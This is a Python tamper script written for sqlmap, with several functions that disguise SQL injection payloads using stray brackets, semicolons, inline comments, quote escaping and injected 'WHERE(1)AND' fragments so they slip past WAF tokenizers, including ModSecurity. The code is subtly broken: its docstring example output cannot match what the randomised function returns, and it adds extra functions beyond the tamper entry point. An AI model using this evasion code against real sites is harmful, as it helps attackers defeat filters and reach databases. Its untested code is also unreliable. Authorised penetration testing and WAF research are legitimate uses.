#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Uses token breaker techniques to confuse WAF tokenizers

    Requirement:
        * MySQL, PostgreSQL, MSSQL

    Tested against:
        * WAFs with token-based parsing
        * ModSecurity
        * Commercial WAFs

    Notes:
        * Attacks on token attempt to break the logic of splitting a request into tokens
        * Token-breakers are symbols that allow affecting the correspondence between
          an element of a string and a certain token
        * Our request must remain valid while using token-breakers
        * Uncontexted brackets, semicolons, and special chars can confuse parsers

    Reference:
        * https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/

    >>> tamper("1 UNION SELECT 1,2,3")
    "1);UNION (SELECT 1,2,3"
    """

    if not payload:
        return payload

    retVal = payload
    
    # Token breaker patterns
    # These add syntactically confusing elements that may still be valid SQL
    
    # Add uncontexted brackets around UNION
    retVal = re.sub(
        r'\bUNION\b',
        lambda m: random.choice([
            ");UNION(",
            ")UNION(",
            "UNION/**/(",
            ")/**/UNION/**/(",
        ]),
        retVal,
        flags=re.IGNORECASE
    )
    
    # Add semicolons and brackets around SELECT
    retVal = re.sub(
        r'\bSELECT\b',
        lambda m: random.choice([
            "SELECT(",
            "(SELECT",
            "/**/SELECT/**/",
            ";SELECT",
        ]),
        retVal,
        flags=re.IGNORECASE
    )
    
    # Close any opened brackets at the end if needed
    open_brackets = retVal.count('(') - retVal.count(')')
    if open_brackets > 0:
        retVal += ')' * open_brackets
    
    return retVal


def tamper_bracket_confusion(payload, **kwargs):
    """
    Adds confusing bracket patterns that may break WAF tokenization
    but remain valid for the database
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Add brackets around numbers and expressions
    retVal = re.sub(
        r'(\d+)',
        lambda m: "(%s)" % m.group(1) if random.random() > 0.5 else m.group(1),
        retVal
    )
    
    # Add brackets around column references
    retVal = re.sub(
        r'\b(id|name|user|pass|password|email)\b',
        lambda m: "(%s)" % m.group(1),
        retVal,
        flags=re.IGNORECASE
    )
    
    return retVal


def tamper_semicolon_injection(payload, **kwargs):
    """
    Injects semicolons to create token boundaries
    May enable stacked queries on vulnerable systems
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Add semicolons before major keywords
    keywords = ["UNION", "SELECT", "FROM", "WHERE"]
    
    for keyword in keywords:
        pattern = re.compile(r'\b(%s)\b' % keyword, re.IGNORECASE)
        retVal = pattern.sub(r';/**/\1', retVal)
    
    # Clean up any double semicolons
    retVal = re.sub(r';+', ';', retVal)
    
    # Remove leading semicolon if present
    retVal = re.sub(r'^\s*;', '', retVal)
    
    return retVal


def tamper_quote_breaker(payload, **kwargs):
    """
    Uses quote manipulation to break token boundaries
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Add escaped quotes that may confuse parsers
    quote_patterns = [
        ("'", "\\'"),
        ("'", "''"),
        ('"', '\\"'),
        ('"', '""'),
    ]
    
    # Randomly escape some quotes
    for original, escaped in quote_patterns:
        if original in retVal and random.random() > 0.7:
            # Only escape some occurrences
            parts = retVal.split(original)
            new_parts = []
            for i, part in enumerate(parts):
                new_parts.append(part)
                if i < len(parts) - 1:
                    if random.random() > 0.5:
                        new_parts.append(escaped)
                    else:
                        new_parts.append(original)
            retVal = ''.join(new_parts)
            break
    
    return retVal


def tamper_context_breaker(payload, **kwargs):
    """
    Attempts to break out of the expected SQL context
    by adding unexpected syntax elements
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Context breaking patterns
    context_breakers = [
        ("UNION", "1);UNION"),
        ("SELECT", "SELECT/*break*/"),
        ("FROM", "FROM/**/"),
        ("WHERE", "WHERE(1)AND"),
    ]
    
    for keyword, replacement in context_breakers:
        if random.random() > 0.5:
            retVal = re.sub(
                r'\b%s\b' % keyword,
                replacement,
                retVal,
                flags=re.IGNORECASE,
                count=1
            )
    
    return retVal
